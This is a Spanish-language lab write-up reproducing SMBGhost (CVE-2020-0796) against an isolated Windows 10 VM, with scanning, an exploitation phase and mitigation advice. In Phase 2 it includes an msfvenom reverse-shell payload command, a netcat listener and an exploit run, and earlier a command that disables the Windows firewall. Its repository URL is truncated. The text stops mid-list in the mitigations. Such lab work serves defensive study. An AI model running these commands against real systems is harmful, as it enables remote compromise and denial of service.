# Laboratorio Windows 10 — Vulnerabilidad SMBGhost (CVE-2020-0796)

**Plataforma:** Laboratorio Local / Entorno Híbrido
**Dificultad:** Media
**Fecha:** 2026-10-25
**Categoría:** Vulnerabilidades de Red / Denegación de Servicio Remota (RDoS) / Corrupción de Memoria

---

## 🎯 Objetivo
El objetivo principal de este laboratorio fue desplegar de forma segura un entorno objetivo vulnerable para analizar las mecánicas de **CVE-2020-0796** (SMBGhost). El proyecto evalúa el aislamiento de la infraestructura, la verificación de la exposición de servicios y el impacto de cabeceras maliciosas de compresión de datos sobre el kernel del sistema operativo.

## 🧰 Entorno y herramientas
- **Atacante:** Kali Linux (Última versión disponible) — `[IP_ATACANTE]`
- **Víctima:** Windows 10 Pro — Versión 1909 / Build 18363 — `[IP_VÍCTIMA]`
- **Herramientas:** Oracle VirtualBox, Nmap, Python3, MSFvenom, Netcat

---

## 🔍 Procedimiento

### Fase 0: Obtención de Recursos y Despliegue del Entorno Víctima

#### 1. Obtención de la Imagen de Disco (ISO) Vulnerable
Debido a que el fallo SMBGhost afecta específicamente a las versiones de Windows 10 con compresión de datos activa en SMBv3, se requirió la localización de una compilación previa a los parches de seguridad de marzo de 2020.
* **Recurso:** Imagen de disco oficial de Windows 10 (Versión 1909 / Build 18363 - 64 bits).
* **Origen:** Repositorio público de preservación digital *Internet Archive* (garantizando una ISO oficial sin alteraciones).
* **Almacenamiento:** El archivo de instalación fue descargado y alojado en una unidad de almacenamiento de estado sólido (SSD) externa dedicada para optimizar el rendimiento de lectura/escritura del hipervisor y conservar espacio en el disco principal.

#### 2. Aislamiento Perimetral de la Red
Se modificaron los parámetros de red en el hipervisor (VirtualBox) antes del arranque inicial para cortar de raíz el acceso a internet de la máquina víctima. Esto previene conexiones involuntarias hacia los servidores de actualizaciones que parcharían el fallo automáticamente.
* **Tipo de Adaptador:** Adaptador sólo-anfitrión (`Host-only Adapter`).
* **Segmento asignado:** Canal privado y exclusivo que comparte comunicación directa únicamente con la máquina atacante, sin salida a puertas de enlace externas.

#### 3. Evasión del Bucle de Instalación (Modificación de Registro)
Durante el despliegue inicial desde la imagen ISO, el asistente de instalación de Windows presentó una interrupción por corrupción de reinicio (error OOBE). Se forzó el levantamiento de la consola administrativa mediante el atajo de teclado (`Shift + F10`) para corregir la directiva del instalador en el registro del sistema, permitiendo una instalación local limpia:
* **Herramienta:** Editor del Registro (`regedit`).
* **Ruta modificada:** `HKLM\SYSTEM\Setup\Status\ChildCompletion`
* **Parámetro:** Se alteró el valor de la clave `setup.exe` de `1` a `3`, forzando al sistema a ignorar el error inicial y continuar de forma fluida hacia la configuración de una cuenta de usuario local sin dependencias de red ("Configuración limitada").

#### 4. Direccionamiento Local y Exposición de Puertos
Una vez iniciado el escritorio, se validó la asignación de la dirección IPv4 estática dentro del segmento aislado. Para permitir que la máquina atacante interactúe libremente con el servicio de compartición de archivos (SMB) de la víctima, se requirió la desactivación total de los perfiles del firewall nativo utilizando privilegios elevados:

```cmd
:: Desactivación global de los perfiles de red del Firewall de Windows
netsh advfirewall set allprofiles state off
```

**Resultado obtenido:** Respuesta exitosa y bidireccional al comando de diagnóstico de red (`ping`) entre ambos sistemas, dejando expuesto de forma exitosa el puerto de red necesario (`445/TCP`) para comenzar las fases posteriores de auditoría y escaneo.

---

### Fase 1: Reconocimiento / Enumeración

El objetivo de esta fase fue verificar la disponibilidad del host en la red, confirmar la exposición del servicio y utilizar scripts de verificación no intrusivos para detectar el estado de la vulnerabilidad sin desestabilizar el kernel objetivo.

#### Conectividad de Red y Escaneo de Puertos
Se realizó un escaneo de red dirigido desde la máquina atacante hacia el host víctima utilizando **Nmap** para evaluar el estado de la infraestructura del protocolo Server Message Block (SMB).

```bash
# Verificar la conectividad del host y escanear el puerto SMB estándar
nmap -p 445 [IP_VÍCTIMA]
```

* **Estado del Puerto Observado:** El puerto `445/tcp` devolvió un estado explícito de `open` (abierto), confirmando que el servicio SMB estaba escuchando activamente y aceptando conexiones entrantes sobre el segmento de red local.

#### Evaluación de Vulnerabilidad No Intrusiva
Para asegurar que la compilación del sistema operativo objetivo era activamente vulnerable antes de intentar vectores de ejecución, se desplegó un script verificador ligero en Python. Este script consulta de forma segura al objetivo enviando cabeceras específicas para probar si la implementación de SMBv3 maneja de manera errónea los mecanismos de compresión de paquetes.

```bash
# Clonar el repositorio confiable del escáner de SMBGhost
git clone https://github.com
cd SMBGhost

# Ejecutar el escáner apuntando a la dirección IP de la víctima
python3 scanner.py [IP_VÍCTIMA]
```

* **Resultado:** El escáner estableció con éxito el saludo de conexión (handshake) con el objetivo y determinó el estado del servicio. La terminal devolvió un indicador positivo confirmando que **la máquina objetivo es vulnerable** al fallo SMBGhost, validando la configuración de nuestro laboratorio.

---

### Fase 2: Exploitation

Con el objetivo confirmado explícitamente como vulnerable, el entorno procedió a la verificación de las mecánicas de explotación. Se desplegaron herramientas de Prueba de Concepto (PoC) de acceso público para analizar el comportamiento del fallo al procesar cargas útiles maliciosas.

#### Análisis de Ejecución Remota de Código (RCE) / Denegación de Servicio Remota (RDoS)
Se lanzó desde la terminal atacante un framework de explotación en Python dirigido a las estructuras de memoria de `srv2.sys`. La herramienta intenta sobrescribir variables de puntero vitales del kernel provocando una primitiva de escritura fuera de límites a través de una cabecera de paquete comprimido SMB2 maliciosa.

```bash
# Generar una carga útil de shell reversa en formato crudo con MSFvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP_ATACANTE] LPORT=4444 -f raw -o exploit.bin

# Configurar el escuchador local en Kali
nc -lvnp 4444

# Ejecutar el script de explotación utilizando los argumentos de sintaxis requeridos
python3 exploit.py -ip [IP_VÍCTIMA]
```

#### Observaciones Técnicas y Comportamiento del Laboratorio:
* **Inestabilidad del Kernel Pool:** Durante la ejecución, las rutinas de asignación de memoria a nivel del kernel demostraron una alta inestabilidad. Aunque el exploit identificó con éxito la base del HAL heap e inyectó el bloque de shellcode en la dirección de memoria calculada, las microasignaciones dentro del entorno virtualizado colapsaron frecuentemente en un pánico de hilos del procesador.
* **Impacto Realizado:** La primitiva fuera de límites forzó de manera regular un pánico del kernel antes de que la conexión de red pudiera estabilizarse de vuelta hacia el escuchador local. El sistema objetivo interrumpió inmediatamente toda conectividad de red, desplegó un **Pantallazo Azul de la Muerte (BSOD)** e inició una secuencia de reinicio automático forzado. Esto demostró con éxito el impacto crítico de Denegación de Servicio Remota (RDoS) de esta vulnerabilidad en redes sin parchar.

---

## 📌 Hallazgos

* **Vulnerabilidad Identificada:** SMBGhost (CVE-2020-0796) — Ejecución Remota de Código / Denegación de Servicio en el Mecanismo de Compresión SMBv3.
* **Clasificación de Severidad:** **Crítica** (Puntuación Base CVSS v3.1: **10.0**).
* **Análisis de Impacto:** Un atacante remoto no autenticado puede explotar este fallo enviando un paquete malformado a un servidor SMBv3 afectado. En una red empresarial de producción, esto podría provocar una interrupción masiva de la infraestructura mediante capacidades de replicación automatizada (capacidades de gusano o *wormable*) o la escalada de privilegios no autorizada y el compromiso total del sistema.

---

## 🛡️ Mitigación / Remediación

Para salvaguardar un entorno empresarial de los riesgos demostrados en este laboratorio, se deben aplicar las siguientes estrategias de mitigación y remediación:

1. **Despliegue de Actualizaciones de Seguridad (Remedio Principal):**
   Aplicar las actualizaciones acumulativas oficiales de Microsoft lanzadas en marzo de 2020 (o posteriores). Específicamente, la instalación del parche **KB4551762** corrige el desbordamiento de enteros subyacente al introducir una verificación de límites adecuada sobre la validación del tamaño del paquete entrante dentro del controlador `srv2.sys`.

2. **Deshabilitar la Compresión SMBv3 (Solución Alternativa / Temporal):**
   Si la aplicación de parches no se puede programar de inmediato debido a restricciones operativas, las funciones de compresión dentro del protocolo SMBv3 se pueden deshabilitar administrativamente a través de PowerShell para anular el vector de ataque sin necesidad de apagar el servicio de compartición de archivos:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "DisableCompression" -Type DWord -Value 1
   ```

3. **Defensas Perimetrales de Red:**
